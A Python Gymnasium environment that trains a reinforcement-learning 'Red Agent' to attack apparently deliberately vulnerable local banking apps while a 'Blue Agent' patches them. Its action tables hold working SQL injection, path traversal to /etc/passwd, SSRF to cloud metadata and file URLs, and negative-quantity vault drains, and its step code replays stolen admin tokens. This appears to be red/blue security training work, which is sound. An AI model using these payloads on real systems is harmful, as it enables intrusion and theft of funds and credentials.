"""
BankingAppEnv — Custom Gymnasium environment for the Red Agent swarm.

This environment wraps the live banking REST API and exposes a Discrete(20) action
space split across 4 agent categories (Recon, Exploit, Escalation, Persistence).
The observation is a Box(10,) normalized state vector capturing step progress,
token state, HTTP feedback, and Blue Agent patch count.  Temporal patterns
(action sequences, multi-step chains) are learned by the LSTM — no hand-crafted
action history is included in the observation.
"""

import json
import time
from typing import Any, Dict, Optional, Tuple

import gymnasium as gym
import numpy as np
import redis
import requests
from gymnasium import spaces


# ---------------------------------------------------------------------------
# Action → HTTP request mapping (Target App 1 - FastApi Banking)
# ---------------------------------------------------------------------------

ACTION_TABLE_1: list[dict[str, Any]] = [
    # ── Recon (0-4) ──────────────────────────────────────────────────────
    {"method": "GET",  "endpoint": "/users/1",         "payload": None,                    "category": 0, "label": "recon_user1"},
    {"method": "GET",  "endpoint": "/users/2",         "payload": None,                    "category": 0, "label": "recon_user2"},
    {"method": "GET",  "endpoint": "/users/3",         "payload": None,                    "category": 0, "label": "recon_user3_admin"},
    {"method": "GET",  "endpoint": "/wallet",          "payload": None,                    "category": 0, "label": "recon_wallet"},
    {"method": "GET",  "endpoint": "/vault",           "payload": None,                    "category": 0, "label": "recon_vault"},
    # ── Exploit (5-9) ────────────────────────────────────────────────────
    {"method": "POST", "endpoint": "/buy",             "payload": {"quantity": -1000},      "category": 1, "label": "exploit_neg_buy"},
    {"method": "POST", "endpoint": "/buy",             "payload": {"quantity": 999999},     "category": 1, "label": "exploit_massive_buy"},
    {"method": "POST", "endpoint": "/admin/withdraw",  "payload": {"quantity": 10000},      "category": 1, "label": "exploit_vault_drain"},
    {"method": "POST", "endpoint": "/buy",             "payload": {"quantity": 0},          "category": 1, "label": "exploit_zero_buy"},
    {"method": "POST", "endpoint": "/admin/withdraw",  "payload": {"quantity": -500},       "category": 1, "label": "exploit_neg_withdraw"},
    # ── Escalation (10-14) ───────────────────────────────────────────────
    {"method": "POST", "endpoint": "/admin/withdraw",  "payload": {"quantity": 5000},       "category": 2, "label": "esc_half_drain"},
    {"method": "GET",  "endpoint": "/users/3",         "payload": None,                    "category": 2, "label": "esc_refetch_admin"},
    {"method": "POST", "endpoint": "/admin/withdraw",  "payload": {"quantity": 9999},       "category": 2, "label": "esc_max_drain"},
    {"method": "POST", "endpoint": "/buy",             "payload": {"quantity": -9999},      "category": 2, "label": "esc_neg_overflow"},
    {"method": "GET",  "endpoint": "/vault",           "payload": None,                    "category": 2, "label": "esc_check_vault"},
    # ── Persistence (15-19) ──────────────────────────────────────────────
    {"method": "POST", "endpoint": "/buy",             "payload": {"quantity": -1},         "category": 3, "label": "persist_micro_drain1"},
    {"method": "POST", "endpoint": "/buy",             "payload": {"quantity": -10},        "category": 3, "label": "persist_micro_drain10"},
    {"method": "GET",  "endpoint": "/wallet",          "payload": None,                    "category": 3, "label": "persist_watch_wallet"},
    {"method": "POST", "endpoint": "/admin/withdraw",  "payload": {"quantity": 1},          "category": 3, "label": "persist_micro_siphon"},
    {"method": "GET",  "endpoint": "/users/3",         "payload": None,                    "category": 3, "label": "persist_revalidate"},
]

# ---------------------------------------------------------------------------
# Action → HTTP request mapping (Target App 2 - Flask Multi-Vuln)
# ---------------------------------------------------------------------------

ACTION_TABLE_2: list[dict[str, Any]] = [
    # ── Recon (0-4) ──────────────────────────────────────────────────────
    {"method": "GET",  "endpoint": "/health",          "payload": None,                    "category": 0, "label": "recon_health"},
    {"method": "POST", "endpoint": "/api/login",       "payload": {"username": "guest"},   "category": 0, "label": "recon_guest"},
    {"method": "POST", "endpoint": "/api/login",       "payload": {"username": "admin"},   "category": 0, "label": "recon_admin"},
    {"method": "GET",  "endpoint": "/api/download",    "payload": None,                    "category": 0, "label": "recon_download_empty"},
    {"method": "POST", "endpoint": "/api/fetch",       "payload": {"url": "http://g.co"},  "category": 0, "label": "recon_proxy_google"},
    # ── Exploit (5-9) ────────────────────────────────────────────────────
    {"method": "POST", "endpoint": "/api/login",       "payload": {"username": "admin' --", "password": ""}, "category": 1, "label": "exploit_sqli_auth_bypass"},
    {"method": "GET",  "endpoint": "/api/download?file=../../secret_config.json", "payload": None, "category": 1, "label": "exploit_lfi_secret"},
    {"method": "POST", "endpoint": "/api/fetch",       "payload": {"url": "http://localhost:8001/internal/admin"}, "category": 1, "label": "exploit_ssrf_admin"},
    {"method": "POST", "endpoint": "/api/login",       "payload": {"username": "' OR 1=1 --", "password": ""}, "category": 1, "label": "exploit_sqli_or"},
    {"method": "GET",  "endpoint": "/api/download?file=app_config.json", "payload": None, "category": 1, "label": "exploit_lfi_public"},
    # ── Escalation (10-14) ───────────────────────────────────────────────
    {"method": "GET",  "endpoint": "/internal/admin",  "payload": None,                    "category": 2, "label": "esc_hit_internal_ssrf"},
    {"method": "POST", "endpoint": "/api/fetch",       "payload": {"url": "http://169.254.169.254/latest/meta-data/"}, "category": 2, "label": "esc_ssrf_aws"},
    {"method": "POST", "endpoint": "/api/login",       "payload": {"username": "admin", "password": "' OR '1'='1"}, "category": 2, "label": "esc_sqli_pass_bypass"},
    {"method": "GET",  "endpoint": "/api/download?file=../../../../../etc/passwd", "payload": None, "category": 2, "label": "esc_lfi_etc_passwd"},
    {"method": "POST", "endpoint": "/api/fetch",       "payload": {"url": "file:///etc/passwd"}, "category": 2, "label": "esc_ssrf_file"},
    # ── Persistence (15-19) ──────────────────────────────────────────────
    {"method": "POST", "endpoint": "/api/login",       "payload": {"username": "admin' /*"}, "category": 3, "label": "persist_sqli_variant"},
    {"method": "GET",  "endpoint": "/api/download?file=../public_files/app_config.json", "payload": None, "category": 3, "label": "persist_lfi_recon"},
    {"method": "POST", "endpoint": "/api/fetch",       "payload": {"url": "http://localhost:8001"}, "category": 3, "label": "persist_ssrf_loop"},
    {"method": "POST", "endpoint": "/api/login",       "payload": {"username": "guest' --"}, "category": 3, "label": "persist_guest_sqli"},
    {"method": "GET",  "endpoint": "/health",          "payload": None, "category": 3, "label": "persist_ping_health"},
]

# We maintain 20 actions to keep the structural dimension identical for the agent
NUM_ACTIONS = len(ACTION_TABLE_1)
OBS_DIM = 10
MAX_STEPS_PER_EPISODE = 200

# Redis keys shared with the rest of the system
REDIS_EXPLOIT_KEY = "exploit_events"
REDIS_PATCH_COUNT_KEY = "patch_count"


class BankingAppEnv(gym.Env):
    """Gymnasium environment that attacks a live banking REST API.

    The agent selects one of 20 discrete actions per step. Each action maps
    to an HTTP request against the target app.  Rewards are shaped by HTTP
    status codes, financial impact, token discovery, and stealth.

    Parameters
    ----------
    base_url : str
        Root URL of the banking API (e.g. ``http://localhost:8000``).
    redis_url : str
        Redis connection URL (e.g. ``redis://localhost:6379``).
    max_steps : int
        Maximum steps per episode before truncation.
    """

    metadata = {"render_modes": []}

    def __init__(
        self,
        base_url: str = "http://localhost:8000",
        redis_url: str = "redis://localhost:6379",
        max_steps: int = MAX_STEPS_PER_EPISODE,
        target_id: int = 1,
    ) -> None:
        super().__init__()

        self.base_url = base_url.rstrip("/")
        self.max_steps = max_steps
        self.target_id = target_id
        
        # Select the active action table based on the target app
        self.action_table = ACTION_TABLE_1 if self.target_id == 1 else ACTION_TABLE_2

        # Spaces
        self.action_space = spaces.Discrete(NUM_ACTIONS)
        self.observation_space = spaces.Box(
            low=0.0, high=1.0, shape=(OBS_DIM,), dtype=np.float32
        )

        # Redis (optional – training must not crash if Redis is down)
        self._redis: Optional[redis.Redis] = None
        try:
            self._redis = redis.Redis.from_url(redis_url, decode_responses=True)
            self._redis.ping()
        except Exception:
            self._redis = None

        # Per-episode state
        self._step_count: int = 0
        self._stolen_token: Optional[str] = None
        self._last_action: int = 0
        self._last_success: bool = False
        self._last_status: int = 0

        self._initial_wallet: float = 100.0
        self._wallet_balance: float = 100.0
        self._token_discovered_this_ep: bool = False

    # ------------------------------------------------------------------
    # Gymnasium API
    # ------------------------------------------------------------------

    def reset(
        self,
        *,
        seed: Optional[int] = None,
        options: Optional[Dict[str, Any]] = None,
    ) -> Tuple[np.ndarray, Dict[str, Any]]:
        """Reset the banking app to a clean state and return initial obs.

        Clears Redis wallet/vault state so the target app re-initialises to
        default values on the next request.  Does **not** rely on a
        ``POST /api/reset`` endpoint (which does not exist).
        """
        super().reset(seed=seed)

        # Clear Redis application state (mirrors reset_demo.py logic)
        if self._redis is not None:
            try:
                self._redis.delete("app_wallet", "app_vault")
            except Exception:
                pass

        # Verify reset by reading wallet (best-effort)
        try:
            resp = requests.get(f"{self.base_url}/wallet", timeout=3)
            if resp.status_code == 200:
                self._wallet_balance = float(resp.json().get("balance", 100))
            else:
                self._wallet_balance = 100.0
        except Exception:
            self._wallet_balance = 100.0

        self._initial_wallet = self._wallet_balance

        # Reset per-episode state
        self._step_count = 0
        self._stolen_token = None
        self._last_action = 0
        self._last_success = False
        self._last_status = 0

        self._token_discovered_this_ep = False

        return self._build_obs(), {}

    def step(
        self, action: int
    ) -> Tuple[np.ndarray, float, bool, bool, Dict[str, Any]]:
        """Execute *action* against the banking API and return transition.

        Returns
        -------
        obs : np.ndarray
            Next observation vector.
        reward : float
            Shaped reward for this step.
        terminated : bool
            Always ``False`` (no terminal success condition).
        truncated : bool
            ``True`` when ``max_steps`` is reached.
        info : dict
            Diagnostic info (status code, endpoint, label, etc.).
        """
        assert self.action_space.contains(action), f"Invalid action {action}"

        entry = self.action_table[action]
        method = entry["method"]
        endpoint = entry["endpoint"]
        payload = entry["payload"]
        category = entry["category"]
        label = entry["label"]

        url = f"{self.base_url}{endpoint}"
        headers: Dict[str, str] = {}

        # Inject stolen token for admin endpoints
        if self._stolen_token is not None:
            headers["X-Admin-Token"] = self._stolen_token

        # ── Execute HTTP request ──────────────────────────────────────
        status_code = 0
        response_body: Dict[str, Any] = {}
        success = False

        try:
            if method == "GET":
                resp = requests.get(url, headers=headers, timeout=5)
            else:
                resp = requests.post(url, json=payload, headers=headers, timeout=5)

            status_code = resp.status_code
            try:
                response_body = resp.json()
            except Exception:
                response_body = {"raw": resp.text[:200]}

            success = status_code in (200, 201)
        except requests.ConnectionError:
            status_code = 0
            response_body = {"error": "connection_refused"}
        except requests.Timeout:
            status_code = 0
            response_body = {"error": "timeout"}
        except Exception as exc:
            status_code = 0
            response_body = {"error": str(exc)[:100]}

        # ── Token extraction ──────────────────────────────────────────
        first_token_this_step = False
        if success and self._stolen_token is None:
            for key in ("secret_key", "token", "access_token", "jwt"):
                if key in response_body:
                    self._stolen_token = str(response_body[key])
                    if not self._token_discovered_this_ep:
                        first_token_this_step = True
                        self._token_discovered_this_ep = True
                    break

        # ── Wallet tracking ───────────────────────────────────────────
        if success:
            new_bal = response_body.get("new_balance")
            if new_bal is not None:
                self._wallet_balance = float(new_bal)
            elif "balance" in response_body:
                self._wallet_balance = float(response_body["balance"])

        # ── Reward shaping ────────────────────────────────────────────
        reward, reward_breakdown = self._compute_reward(
            action=action,
            category=category,
            status_code=status_code,
            success=success,
            first_token=first_token_this_step,
            response_body=response_body,
        )

        # ── Publish EVERY event to Redis for the React Dashboard ─
        self._publish_exploit(action, entry, status_code, response_body, reward)

        # ── Update internal state ─────────────────────────────────────
        self._last_action = action
        self._last_success = success
        self._last_status = status_code

        self._step_count += 1
        truncated = self._step_count >= self.max_steps
        terminated = False

        info = {
            "status_code": status_code,
            "endpoint": endpoint,
            "label": label,
            "category": category,
            "success": success,
            "has_token": self._stolen_token is not None,
            "wallet": self._wallet_balance,
            "reward_breakdown": reward_breakdown,
        }

        return self._build_obs(), reward, terminated, truncated, info

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _compute_reward(
        self,
        action: int,
        category: int,
        status_code: int,
        success: bool,
        first_token: bool,
        response_body: Dict[str, Any],
    ) -> Tuple[float, Dict[str, float]]:
        """Compute shaped reward based on action outcome.

        Returns both the total reward and a breakdown dict for auditing.

        Reward components
        -----------------
        base_http : float
            +0.1 for 200/201, -0.05 for other failures, -0.5 for 403
            (patched), -1.0 for 429 (rate-limited), -0.1 for connection
            refused / timeout.
        token_discovery : float
            +0.5 for the *first* stolen token discovered in an episode.
            Only fires once per episode to avoid reward hacking.
        financial_impact : float
            +1.0 to +5.0 for successful financial exploits (category 1),
            scaled by the dollar delta from initial wallet balance.
            Formula: min(5.0, 1.0 + (delta / 2500) * 4.0)
        escalation : float
            +2.0 for any successful privilege-escalation (category 2).
            +3.0 additional bonus if vault drained > $5000.
        persistence : float
            +0.3 for successful persistence/stealth actions (category 3).
            Encourages maintaining access quietly.

        Returns
        -------
        reward : float
            Sum of all components.
        breakdown : dict
            Individual component values for auditing.
        """
        breakdown: Dict[str, float] = {
            "base_http": 0.0,
            "token_discovery": 0.0,
            "financial_impact": 0.0,
            "escalation": 0.0,
            "persistence": 0.0,
        }

        # ── Base HTTP status reward ──
        if status_code == 0:
            breakdown["base_http"] = -0.1       # connection refused / timeout
        elif success:
            breakdown["base_http"] = 0.1        # any 200/201
        elif status_code == 403:
            breakdown["base_http"] = -0.5       # patched / forbidden
        elif status_code == 429:
            breakdown["base_http"] = -1.0       # rate-limited (Blue detected)
        else:
            breakdown["base_http"] = -0.05      # other failures (400, 404, 422 …)

        if not success:
            total = sum(breakdown.values())
            return total, breakdown

        # ── Token discovery bonus (once per episode) ──
        if first_token:
            breakdown["token_discovery"] = 0.5

        # ── Financial impact bonus (category 1 = exploit) ──
        if category == 1:
            new_bal = response_body.get("new_balance")
            if new_bal is not None:
                delta = float(new_bal) - self._initial_wallet
                if delta > 0:
                    # Scale: +1.0 base, up to +5.0 for large amounts
                    scaled = min(5.0, 1.0 + (delta / 2500.0) * 4.0)
                    breakdown["financial_impact"] = scaled

        # ── Privilege escalation bonus (category 2) ──
        if category == 2:
            vault_remaining = response_body.get("vault_remaining")
            if vault_remaining is not None:
                breakdown["escalation"] = 2.0
                drained = 10000 - float(vault_remaining)
                if drained > 5000:
                    breakdown["escalation"] += 3.0
            
            # Target App 2 (Flask) escalation tokens
            if "status" in response_body and response_body.get("status") == "success":
                val = str(response_body.get("secret", "")) + str(response_body.get("content", ""))
                if "ROOT" in val or "PASSWORD" in val.upper() or "TOKEN_777" in val:
                    breakdown["escalation"] += 3.0

        # ── Persistence / stealth bonus (category 3) ──
        if category == 3:
            breakdown["persistence"] = 0.3

        total = sum(breakdown.values())
        return total, breakdown

    def _build_obs(self) -> np.ndarray:
        """Build the 10-dimensional observation vector.

        Temporal patterns (action sequences, multi-step chains) are learned
        by the LSTM — no hand-crafted action history is included here.

        Layout:
        [0]    step progress (current_step / max_steps)
        [1]    has_token (0 or 1)
        [2]    last_action / 19
        [3]    last_success (0 or 1)
        [4]    last_status / 500
        [5-8]  category one-hot (4 flags)
        [9]    patch_count / 10
        """
        obs = np.zeros(OBS_DIM, dtype=np.float32)

        obs[0] = self._step_count / max(self.max_steps, 1)
        obs[1] = 1.0 if self._stolen_token is not None else 0.0
        obs[2] = self._last_action / 19.0
        obs[3] = 1.0 if self._last_success else 0.0
        obs[4] = min(self._last_status / 500.0, 1.0)

        # Category one-hot for last action
        cat = self.action_table[self._last_action]["category"]
        obs[5 + cat] = 1.0

        # Patch count from Redis
        obs[9] = self._read_patch_count() / 10.0

        return np.clip(obs, 0.0, 1.0)

    def _read_patch_count(self) -> float:
        """Read the Blue Agent's patch counter from Redis (best-effort)."""
        if self._redis is None:
            return 0.0
        try:
            val = self._redis.get(REDIS_PATCH_COUNT_KEY)
            return float(val) if val else 0.0
        except Exception:
            return 0.0

    def _publish_exploit(
        self,
        action: int,
        entry: Dict[str, Any],
        status_code: int,
        response_body: Dict[str, Any],
        reward: float,
    ) -> None:
        """Publish a successful exploit event to Redis for the Blue Agent."""
        print(f"DEBUG: _publish_exploit called with action {action}, self._redis is {self._redis}", flush=True)
        if self._redis is None:
            return

        event = {
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S"),
            "agent_id": entry["category"],
            "action_id": action,
            "endpoint": entry["endpoint"],
            "method": entry["method"],
            "payload": entry["payload"],
            "status_code": status_code,
            "response_snippet": json.dumps(response_body)[:200],
            "reward": round(reward, 3),
            "category": ["recon", "exploit", "escalation", "persistence"][
                entry["category"]
            ],
        }

        try:
            msg = json.dumps(event)
            self._redis.rpush(REDIS_EXPLOIT_KEY, msg)
            self._redis.publish("events", msg)
        except Exception:
            pass  # Never crash training due to Redis issues
